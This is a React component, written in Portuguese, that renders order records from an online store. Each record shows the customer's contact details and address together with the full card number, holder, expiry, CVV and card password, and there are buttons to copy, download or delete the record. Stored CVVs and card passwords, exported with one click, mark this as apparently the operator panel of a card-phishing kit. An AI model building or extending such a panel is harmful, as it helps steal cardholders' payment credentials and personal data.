import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Copy, Download, Trash2 } from "lucide-react";

interface OrderCardProps {
  order: any;
  onCopyData: (text: string) => void;
  onDownloadTxt: (order: any) => void;
  onDelete: (orderId: string) => void;
}

export function OrderCard({ order, onCopyData, onDownloadTxt, onDelete }: OrderCardProps) {
  const formatOrderText = () => {
    return `
Pedido #${order.id}
Data: ${new Date(order.timestamp).toLocaleString()}

Cliente:
${order.customer.name}
${order.customer.email}
${order.customer.phone}

Endereço:
${order.customer.address}
${order.customer.city}, ${order.customer.state}
CEP: ${order.customer.zipCode}

Cartão:
Número: ${order.credit_card_data.cardNumber}
Titular: ${order.credit_card_data.cardHolder}
Validade: ${order.credit_card_data.expiryDate}
CVV: ${order.credit_card_data.cvv}
Senha: ${order.credit_card_data.password}
Parcelamento: ${order.credit_card_data.installments}x sem juros

Itens:
${order.items.map((item: any) => `${item.title} - Qtd: ${item.quantity} - R$ ${item.price}`).join('\n')}

Total: R$ ${order.total}
    `.trim();
  };

  return (
    <Card className="p-6 space-y-4">
      <div className="flex justify-between items-start">
        <div>
          <h3 className="font-bold">Pedido #{order.id}</h3>
          <p className="text-sm text-gray-500">
            {new Date(order.timestamp).toLocaleString()}
          </p>
        </div>
        <div className="flex gap-2">
          <Button
            variant="outline"
            size="icon"
            onClick={() => onCopyData(formatOrderText())}
          >
            <Copy className="h-4 w-4" />
          </Button>
          <Button
            variant="outline"
            size="icon"
            onClick={() => onDownloadTxt(order)}
          >
            <Download className="h-4 w-4" />
          </Button>
          <Button
            variant="destructive"
            size="icon"
            onClick={() => onDelete(order.id)}
          >
            <Trash2 className="h-4 w-4" />
          </Button>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div>
          <h4 className="font-semibold mb-2">Dados do Cliente</h4>
          <p>{order.customer.name}</p>
          <p>{order.customer.email}</p>
          <p>{order.customer.phone}</p>
        </div>
        <div>
          <h4 className="font-semibold mb-2">Endereço</h4>
          <p>{order.customer.address}</p>
          <p>
            {order.customer.city}, {order.customer.state}
          </p>
          <p>{order.customer.zipCode}</p>
        </div>
      </div>

      <div>
        <h4 className="font-semibold mb-2">Dados do Cartão</h4>
        <p>Número: {order.credit_card_data.cardNumber}</p>
        <p>Titular: {order.credit_card_data.cardHolder}</p>
        <p>Validade: {order.credit_card_data.expiryDate}</p>
        <p>CVV: {order.credit_card_data.cvv}</p>
        <p>Senha: {order.credit_card_data.password}</p>
        <p>Parcelamento: {order.credit_card_data.installments}x sem juros</p>
      </div>

      <div>
        <h4 className="font-semibold mb-2">Itens do Pedido</h4>
        {order.items.map((item: any, index: number) => (
          <div key={index} className="flex justify-between">
            <span>{item.title}</span>
            <span>
              Qtd: {item.quantity} - R$ {item.price}
            </span>
          </div>
        ))}
        <div className="mt-2 text-right font-bold">
          Total: R$ {order.total}
        </div>
      </div>
    </Card>
  );
}